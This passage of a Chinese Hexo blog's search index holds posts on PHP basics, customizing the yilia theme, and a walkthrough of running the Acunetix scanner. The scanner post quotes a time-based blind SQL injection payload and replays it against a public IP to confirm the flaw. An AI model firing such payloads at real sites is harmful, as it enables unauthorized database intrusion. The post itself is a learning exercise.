fopen(&quot;/data/webroot/resource/php/f.txt&quot;,&quot;r&quot;);//&quot;r&quot;表示打开只读文件if ($file_handle)&#123;    //接着采用while循环（后面语言结构语句中的循环结构会详细介绍）一行行地读取文件，然后输出每行的文字    while (!feof($file_handle)) &#123; //判断是否到最后一行        $line = fgets($file_handle); //读取一行文本        echo $line; //输出一行文本        echo &quot;&lt;br /&gt;&quot;; //换行    &#125;&#125;fclose($file_handle);//关闭文件?&gt;</code></pre><p>这个测试是需要服务器上存在“f.txt”这个文件的，如果不存在会报错，并且注意路径要正确。</p><h2 id="第二种特殊类型—空类型"><a href="#第二种特殊类型—空类型" class="headerlink" title="第二种特殊类型—空类型"></a>第二种特殊类型—<font color=darkorange >空类型</font></h2><p><font color=darkorange >空类型</font>（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。</p><pre><code class="php">&lt;?php  error_reporting(0); //禁止显示PHP警告提示 $var;//为变量未赋值 var_dump($var); $var1 = null;//“null”赋值给变量“$var1” var_dump($var1); $var2 = NULL;//将“NULL”赋值给变量“$var2” var_dump( $var2); $var3 = &quot;节日快乐！&quot;; unset($var3);//将变量“$var3”注销定义 var_dump($var3);?&gt;</code></pre><p>运行结果：</p><blockquote><p>NULL NULL NULL NULL</p></blockquote><hr><center><font color=green >未完待续.....</font></center>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="2020/12/10/Hexo-yilia%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E7%BE%8E%E5%8C%96%E5%8F%8A%E5%8A%9F%E8%83%BD%E6%B7%BB%E5%8A%A0/"/>
      <url>2020/12/10/Hexo-yilia%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E7%BE%8E%E5%8C%96%E5%8F%8A%E5%8A%9F%E8%83%BD%E6%B7%BB%E5%8A%A0/</url>
      
        <content type="html"><![CDATA[<p>﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—<br>title: Hexo-yilia主题个性化美化及功能添加<br>date: 2020-02-17 11:18:24<br>tags: </p><ul><li>Hexo</li><li>主题<br>cover: <a href="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1582709614468&amp;di=5ffbec934c890aba60d63718f63a3c15&amp;imgtype=0&amp;src=http://b-ssl.duitang.com/uploads/item/201812/03/20181203221415_djuds.jpg">https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1582709614468&amp;di=5ffbec934c890aba60d63718f63a3c15&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201812%2F03%2F20181203221415_djuds.jpg</a></li></ul><hr><h1 id="yilia主题安装需要的命令"><a href="#yilia主题安装需要的命令" class="headerlink" title="yilia主题安装需要的命令"></a>yilia主题安装需要的命令</h1><p>从你的博客根目录转到<strong>thmes</strong>文件夹内，在此处<code>bash here</code>并在小黑窗中输入命令：</p><pre><code class="bash">$ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</code></pre><p>后在博客根目录的<code>_config.yml</code>文件中修改<code>theme: </code>后面的内容为<strong>yilia</strong>(这里是更改该调用的主题，默认的是<strong>landscape</strong>)</p><p><em>有些同学改为yilia之后并没有调用并出现一大堆报错，下载到<strong>thmes</strong>中的<strong>yilia</strong>主题的名称可能是<strong>hexo-theme-yilia</strong>，将两个地方名字更改一致就好了。</em><br>中间可能会有人安装配置过程中出错，<br>初始化出错，补充以下参数：</p><p>hexo sever出错，补充以下参数：</p><pre><code class="bash">npm install hexo-renderer-ejs--savenpm install hexo-renderer-stylus--savenpm install hexo-renderer-marked--save</code></pre><p>执行<code>hexo g</code>命令后，报错：<em>incomplete explicit mapping pair; a key node is missed</em><br>主题目录下所有yml文件中所有有空格的字段都用双引号括起来，尤其注意languages下面的yml文件。</p><h3 id="hexo根目录文件解释"><a href="#hexo根目录文件解释" class="headerlink" title="hexo根目录文件解释"></a>hexo根目录文件解释</h3><p><code>node_modules</code>：是依赖包<br><code>public</code>：存放的是生成的页面<br><code>scaffolds</code>：命令生成文章等的模板<br><code>source</code>：用命令创建的各种文章<br><code>themes</code>：主题<br><code>_config.yml</code>：整个博客的配置<br><code>db.json</code>：source解析所得到的<br><code>package.json</code>：项目所需模块项目的配置信息</p><blockquote><h1 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h1><p>title: 大何生のBLOG          //站点标题<br>subtitle: 积跬步，至千里。    //站点副标题<br>description: ‘’        //站点描述<br>keywords:         //博客关键字<br>author: 大何生         //作者<br>language: en         //语言<br>timezone: ‘’        //时间</p></blockquote><p>查看所有配置文件：</p><pre><code class="bash">npm i hexo-generator-json-content --save</code></pre><p>###拿我的博客举例，配置好后<code>hexo s</code>预览的样子:<br><img src="https://img-blog.csdnimg.cn/20200224211807927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">yilia主题本身的色调就很让像我这种不爱花里胡哨的人喜欢，但还是要学会修改一些东西才能更熟练的应用本主题，下面开始：</p><h4 id="№1-显示摘要（而不是全文显示）"><a href="#№1-显示摘要（而不是全文显示）" class="headerlink" title="№1 显示摘要（而不是全文显示）"></a>№1 显示摘要（而不是全文显示）</h4><p>在编辑你的博文的时候在你需要在摘要出显示出来的内容后面插入一行<br><code>css&lt;!--more--&gt;</code></p><h4 id="№2-优先级配置"><a href="#№2-优先级配置" class="headerlink" title="№2 优先级配置"></a>№2 优先级配置</h4><p>修改根目录配置文件<code>/_config.yml</code>,top值-1标示根据top值倒序（正序设置为1即可），同样<code>date</code>也是根据创建日期倒序。</p><pre><code class="javascript">index_generator:  path: &#39;&#39;  per_page: 10  order_by:    top: -1    date: -1</code></pre><h4 id="№3-在左侧显示总文章数"><a href="#№3-在左侧显示总文章数" class="headerlink" title="№3 在左侧显示总文章数"></a>№3 在左侧显示总文章数</h4><p>将<strong>themes\yilia\layout_partial\</strong><code>left-col.ejs</code>文件的<br><img src="https://img-blog.csdnimg.cn/20200224222637849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="javascript">&lt;nav class=&quot;header-menu&quot;&gt;    &lt;ul&gt;    &lt;% for (var i in theme.menu)&#123; %&gt;        &lt;li&gt;&lt;a href=&quot;&lt;%- url_for(theme.menu[i]) %&gt;&quot;&gt;&lt;%= i %&gt;&lt;/a&gt;&lt;/li&gt;    &lt;%&#125;%&gt;    &lt;/ul&gt;&lt;/nav&gt;</code></pre><p>后面加上</p><pre><code class="javascript">&lt;nav&gt;    总文章数 &lt;%=site.posts.length%&gt;&lt;/nav&gt;</code></pre><h4 id="插入网易云音乐播放器"><a href="#插入网易云音乐播放器" class="headerlink" title="插入网易云音乐播放器"></a>插入网易云音乐播放器</h4><p>打开网易云音乐首页，复制你喜欢的的背景音乐分享外链复制源码</p><p><img src="https://img-blog.csdnimg.cn/20200224223149595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="css">&lt;% if (theme.music &amp;&amp; theme.music.enable)&#123; %&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=330 height=86 src=&quot;//music.163.com/outchain/player?type=2&amp;id=445886994&amp;auto=1&amp;height=66&quot;&gt;&lt;/iframe&gt;&lt;% &#125; %&gt;</code></pre><p>这里的宽度和高度是可以为量调整的,在其中的<code>width=??</code> <code>height=??</code>。<br>在<strong>themes/yilia/layout/_partial/left-col.ejs</strong>文件<code>nav</code>标签中添加代码:<br>注：放在<code>&lt;nav class=&quot;header-nav&quot;&gt;</code>和<code>&lt;/nav&gt;</code>之内<br>这里添加了一些判断和表达式。<br>在yilia主题配置文件<code>_config.yml</code>中添加属性:</p><pre><code class="javascript"># 网易云音乐插件music:  enable: true  #id: 1332647902  # 网易云分享的ID  autoplay: true  # 是否开启自动播放</code></pre><h3 id="№4-个人外部宣传"><a href="#№4-个人外部宣传" class="headerlink" title="№4 个人外部宣传"></a>№4 个人外部宣传</h3><p>打开<strong>themes/yilia/_config.yml</strong><br><img src="https://img-blog.csdnimg.cn/20200224222703977.png" alt="在这里插入图片描述"></p><pre><code class="javascript"># SubNavsubnav:  #github: &quot;#&quot;  weibo: &quot;https://weibo.com/p/1005055125083612&quot;  #rss: &quot;#&quot;  zhihu: &quot;https://www.zhihu.com/people/he-sheng-51-24&quot;  #qq: &quot;202299834&quot;  weixin: &quot;/assets/wei.jpg&quot;  #jianshu: &quot;#&quot;  #douban: &quot;#&quot;  #segmentfault: &quot;#&quot;  bilibili: &quot;https://space.bilibili.com/39971838&quot;  #acfun: &quot;#&quot;  mail: &quot;mailto:he.shao@foxmail.com&quot;  #facebook: &quot;#&quot;  #google: &quot;#&quot;  #twitter: &quot;#&quot;  #linkedin: &quot;#&quot;</code></pre><p>不想显示的在前面加<code>#</code>如果需要显示，前面不要加<code>#</code></p><h4 id="№5配置显示"><a href="#№5配置显示" class="headerlink" title="№5配置显示"></a>№5配置显示</h4><p>修改该文件：<strong>themes/yilia/_config.yml</strong><br>在里面加入：</p><pre><code class="sql">#版权基础设定：0-关闭声明； 1-文章对应的md文件里有declare: true属性，才有版权声明； 2-所有文章均有版权声明#当前应用的版权协议地址。#版权协议的名称#版权协议的Logodeclare_type: 1licensee_url: https://creativecommons.org/licenses/by-nc-sa/4.0/licensee_name: &#39;知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议&#39;licensee_img: https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png</code></pre><p>然后在需要进行版权声明的文章的md文件头部，设置属性:</p><p><code>bash declare:true</code></p><h4 id="№6-字数、阅读时长添加"><a href="#№6-字数、阅读时长添加" class="headerlink" title="№6 字数、阅读时长添加"></a>№6 字数、阅读时长添加</h4><p>安装<strong>hexo-wordcount</strong> 安装完就报错了 <code>pass</code><br>在博客目录下打开<strong>terminal</strong>，输入命令</p><pre><code class="bash">npm i --save hexo-wordcount</code></pre><h4 id="№7-鼠标点击小红心的设置"><a href="#№7-鼠标点击小红心的设置" class="headerlink" title="№7 鼠标点击小红心的设置"></a>№7 鼠标点击小红心的设置</h4><p>在 <strong>hexo/themes/yilia/source</strong><br>文件目录下添加<strong>love.js</strong>文件。<br><strong>love.js</strong>文件内这样编辑：</p><pre><code class="js">!function(e,t,a)&#123;function r()&#123;for(var e=0;e&lt;s.length;e++)s[e].alpha&lt;=0?(t.body.removeChild(s[e].el),s.splice(e,1)):(s[e].y--,s[e].scale+=.004,s[e].alpha-=.013,s[e].el.style.cssText=&quot;left:&quot;+s[e].x+&quot;px;top:&quot;+s[e].y+&quot;px;opacity:&quot;+s[e].alpha+&quot;;transform:scale(&quot;+s[e].scale+&quot;,&quot;+s[e].scale+&quot;) rotate(45deg);background:&quot;+s[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function n()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),o(e)&#125;&#125;function o(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,s.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:c()&#125;),t.body.appendChild(a)&#125;function i(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function c()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var s=[];e.requestAnimationFrame=e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;,i(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#39;&#39;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),n(),r()&#125;(window,document);</code></pre><p>在文件<strong>hexo/themes/yilia/layout/_partial/footer.ejs</strong><br>文件的最后， 添加以下代码：</p><pre><code class="javascript">&lt;!--页面点击小红心--&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/love.js&quot;&gt;&lt;/script&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020022421445625.png" alt="小爱心"></p><h4 id="№8-文本结束并且与more无冲突"><a href="#№8-文本结束并且与more无冲突" class="headerlink" title="№8 文本结束并且与more无冲突"></a>№8 文本结束并且与more无冲突</h4><p>打开<strong>yourblog\themes\yilia\layout_partial</strong>文件夹，</p><p>样图：<img src="https://img-blog.csdnimg.cn/2020022422253162.png" alt="样图"><br>并编辑<code>article.ejs</code>文件<br>并在这段代码：</p><pre><code class="css">&lt;% if (!post.noDate)&#123; %&gt;        &lt;%- partial(&#39;post/date&#39;, &#123;class_name: &#39;archive-article-date&#39;, date_format: null&#125;) %&gt;        &lt;% &#125; %&gt;      &lt;/header&gt;    &lt;% &#125; %&gt;    &lt;div class=&quot;article-entry&quot; itemprop=&quot;articleBody&quot;&gt;      &lt;% if (post.excerpt &amp;&amp; index)&#123; %&gt;        &lt;%- post.excerpt %&gt;        &lt;% if (theme.excerpt_link) &#123; %&gt;          &lt;a class=&quot;article-more-a&quot; href=&quot;&lt;%- url_for(post.path) %&gt;#more&quot;&gt;&lt;%= theme.excerpt_link %&gt; &gt;&gt;&lt;/a&gt;        &lt;% &#125; %&gt;      &lt;% &#125; else &#123; %&gt;        &lt;%- post.content %&gt;      &lt;% &#125; %&gt;</code></pre><p>的下面添加：</p><pre><code class="css">&lt;% if ((theme.essayending_type === 2 || (theme.essayending_type === 1 &amp;&amp; post.essayending)) &amp;&amp; !index)&#123; %&gt;       &lt;% if  (!index)&#123; %&gt;         &lt;div class=&quot;essayending&quot;&gt;           &lt;div&gt;            &lt;div style=&quot;text-align:center;color: #ccc;font-size:22px;&quot;&gt;            &lt;br/&gt;            &lt;br/&gt; -------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------            &lt;br/&gt;            &lt;br/&gt;             &lt;br/&gt;             &lt;br/&gt;            &lt;/div&gt;           &lt;/div&gt;         &lt;/div&gt;         &lt;% &#125; else &#123;%&gt;         &lt;div class=&quot;essayending&quot; hidden=&quot;hidden&quot;&gt;&lt;/div&gt;       &lt;% &#125; %&gt;  &lt;% &#125; %&gt;</code></pre><p>然后在<strong>\theme\yilia_config.yml</strong><br>文件中找到合适位置添加：</p><pre><code class="javascript">#文章结束essayending_type: 1 #0关闭文章结束提示 2全开 1需要在文章开头加上 essayending: true</code></pre><h4 id="№9-修复手机浏览出现以下问题"><a href="#№9-修复手机浏览出现以下问题" class="headerlink" title="№9 修复手机浏览出现以下问题"></a>№9 修复手机浏览出现以下问题</h4><p>所有文章无法查看<br><img src="https://img-blog.csdnimg.cn/2020022421562159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="主题故障"><br>将此中出现的内从全部复制，打开根目录的全局配置文件<code>_config.yml</code>在文件的最下面把这些内容然贴进去就好了：</p><pre><code class="javascript">jsonContent:    meta: false    pages: false    posts:      title: true      date: true      path: true      text: false      raw: false      content: false      slug: false      updated: false      comments: false      link: false      permalink: false      excerpt: false      categories: false      tags: true</code></pre><h4 id="№10-404-界面"><a href="#№10-404-界面" class="headerlink" title="№10 404 界面"></a>№10 404 界面</h4><p>直接在hexo/source文件夹里面加一个个性的404.html，内容自定可以到网上下载推荐个链接<a href="https://www.17sucai.com/pins/tag/281.html">个性404界面模板</a><img src="https://img-blog.csdnimg.cn/20200224220348402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="№-11单篇文章点击量"><a href="#№-11单篇文章点击量" class="headerlink" title="№ 11单篇文章点击量"></a>№ 11单篇文章点击量</h4><p><img src="https://img-blog.csdnimg.cn/2020022422240034.png" alt="在这里插入图片描述"><br>在<strong>themes/yilia/layout/_partial/article.ejs</strong>中 在</p><pre><code class="javascript">&lt;%- partial(&#39;post/title&#39;, &#123;class_name: &#39;article-title&#39;&#125;) %&gt;</code></pre><p>后面插入如下代码：</p><pre><code class="javascript">&lt;!--显示阅读次数--&gt;&lt;% if (!index &amp;&amp; post.comments)&#123; %&gt;  &lt;br/&gt;  &lt;a class=&quot;cloud-tie-join-count&quot; href=&quot;javascript:void(0);&quot; style=&quot;color:gray;font-size:14px;&quot;&gt;  &lt;span class=&quot;icon-sort&quot;&gt;&lt;/span&gt;  &lt;span id=&quot;busuanzi_container_page_pv&quot; style=&quot;color:#ef7522;font-size:14px;&quot;&gt;      阅读数: &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次 &amp;nbsp;&amp;nbsp;  &lt;/span&gt;  &lt;/a&gt;&lt;% &#125; %&gt;&lt;!--显示阅读次数完毕--&gt;</code></pre><h4 id="先做人，再做事，近期对hexo-yilia的探索就是这些，步子小，但不能停下来。"><a href="#先做人，再做事，近期对hexo-yilia的探索就是这些，步子小，但不能停下来。" class="headerlink" title="先做人，再做事，近期对hexo-yilia的探索就是这些，步子小，但不能停下来。"></a>先做人，再做事，近期对hexo-yilia的探索就是这些，步子小，但不能停下来。</h4><h2 id="积跬步，至千里，加油！"><a href="#积跬步，至千里，加油！" class="headerlink" title="积跬步，至千里，加油！"></a><code>积跬步，至千里，加油！</code></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWVS的使用_一次简单的实战扫描测试 [acunetix] [SQL]</title>
      <link href="2020/12/10/AWVS%E7%9A%84%E4%BD%BF%E7%94%A8_%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AE%9E%E6%88%98%E6%89%AB%E6%8F%8F%E6%B5%8B%E8%AF%95%20%5Bacunetix%5D%20%5BSQL%5D/"/>
      <url>2020/12/10/AWVS%E7%9A%84%E4%BD%BF%E7%94%A8_%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AE%9E%E6%88%98%E6%89%AB%E6%8F%8F%E6%B5%8B%E8%AF%95%20%5Bacunetix%5D%20%5BSQL%5D/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> su - root                  切换到root用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> service acunetix start     启动acunetix（无反馈信息）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> service acunetix status    查看acunetix的相关信息</span></span><br></pre></td></tr></table></figure><p>绿色的<font color=green>active (running)</font>代表正在运行中，下面会有很多时间节点信息，CTRL+C停止。<br><img src="https://img-blog.csdnimg.cn/20200920173500737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在本机访问该地址</p><blockquote><p><a href="https://192.168.197.135:3443/">https://192.168.197.135:3443/</a></p></blockquote><p><code>https</code> 上篇讲安装配置的时候有讲该工具用的是https协议。<br><code>192.168.197.135</code> 通过<code>ip a</code>找到该网卡的ip地址。<br><code>3443</code>端口号，Linux-acunetix默认为13443，Windows-acunetix默认端口号为3443。</p><p><strong>老样子报错，老样子解决</strong><br><img src="https://img-blog.csdnimg.cn/20200920175302317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>键入邮箱密码登录。。。。。。<br>⬇</p><h1 id="扫描测试"><a href="#扫描测试" class="headerlink" title="扫描测试"></a>扫描测试</h1><h3 id="添加Target"><a href="#添加Target" class="headerlink" title="添加Target"></a>添加Target</h3><p>填写目标的域名或者IP<br><img src="https://img-blog.csdnimg.cn/20200920180643488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里我拿来联系的IP是<a href="http://59.63.200.79:6453/%EF%BC%8C%E7%AC%AC%E4%BA%8C%E6%A0%8F%E6%B7%BB%E5%8A%A0%E6%8F%8F%E8%BF%B0%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%E6%89%AB%E6%8F%8F%E5%B7%A5%E7%A8%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%A1%AB%E4%B8%8A%E6%97%A5%E6%9C%9F%E6%9C%AC%E6%AC%A1%E6%89%AB%E6%8F%8F%E7%9A%84%E7%9B%AE%E7%9A%84%E7%AD%89%E7%AD%89%E3%80%82">http://59.63.200.79:6453/，第二栏添加描述，如果是扫描工程，可以填上日期本次扫描的目的等等。</a></p><h3 id="设置扫描选项"><a href="#设置扫描选项" class="headerlink" title="设置扫描选项"></a>设置扫描选项</h3><p>uSensor插件，可以打开，类似于爬虫，用来爬取该网站的插件，插件的文件类型可选。<br><img src="https://img-blog.csdnimg.cn/20200920181516515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>Crawling可爬取站内各路径文件，选择性抓取。<br><img src="https://img-blog.csdnimg.cn/20200920181708531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还有这些功能~根据自己需求自行添加<img src="https://img-blog.csdnimg.cn/20200920181915240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="设置扫描类型和扫描时间"><a href="#设置扫描类型和扫描时间" class="headerlink" title="设置扫描类型和扫描时间"></a>设置扫描类型和扫描时间</h3><p>扫描速度scan Speed（越慢越仔细）、站点是偶需要登录 site login、针对不同的Web站点的扫描插件AcuAensor<br>(能帮助搜集到更多信息)</p><p>扫描类型有<br><strong>全扫描、高风险漏洞、跨站点脚本漏洞、SQL注入漏洞、密码不足、仅抓取、恶意软件扫描</strong><br>时间是有<br><strong>瞬间、未来扫描、循环扫描</strong><br>报告可根据自身见识选择。</p><h3 id="Create-Scan开始扫描"><a href="#Create-Scan开始扫描" class="headerlink" title="Create Scan开始扫描"></a>Create Scan开始扫描</h3><p>扫描完成后危险等级，总体进程步骤、扫描时长、目标信息、危险类型一目了然。<img src="https://img-blog.csdnimg.cn/20200920183728558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击最新报警中的人一个报警都可以打开观察漏洞，详细的进行漏洞分析。<br>例如红色高危漏洞SQL盲注<br><img src="https://img-blog.csdnimg.cn/20200920184011122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到该条SQL盲注的攻击细节是URL编码的GET输入id设置为0’XOR(if(now()=sysdate(),sleep(0),0))XOR’Z<br>下面还提供了9条可以注入复现该漏洞的语句，我们可以选用其中一个，做一次漏洞复现测试。<br>语句中的<code>sleep(6)</code>是为了扩大范围，如果真的存在漏洞会产生延迟，运行之前同时打开浏览器的检查工具，切换的Network.</p><p><img src="https://img-blog.csdnimg.cn/20200920185517469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现执行后出现<code>Load:6.06 s</code>有六秒钟的延迟，与Scan扫描之后生成的报告信息一致，报告无误，复现成功。<br><img src="https://img-blog.csdnimg.cn/20200920190031617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再次洁面，还汇总了目标网站的HTTP的请求头，和响应包信息。后面还有该漏洞的说明，以及弥补此漏洞需要参考的一些知识点以链接形式呈现，学无止境啊。<br>最后可以将该次扫描生成报告，报告的格式有很多种，根据需要，自行选择<br><img src="https://img-blog.csdnimg.cn/20200920190656203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>报告在保下载的时候，如果之前对目标网站的扫描报告，可以选择在之前的报告书内进行续写，就很nice吼~<br>这里面服务信息、操作系统、扫描出来的漏洞类型、数量等等很多很多信息，还有关于各类漏洞的漏洞详情，最后的一些链接是本次扫描的扫描项目，演的的不同代表了这些项目里都是否有安全风险，如果有根据颜色区别开来漏洞的多少，严重性。<br><img src="https://img-blog.csdnimg.cn/20200920191041109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/10/hello-world/"/>
      <url>2020/12/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
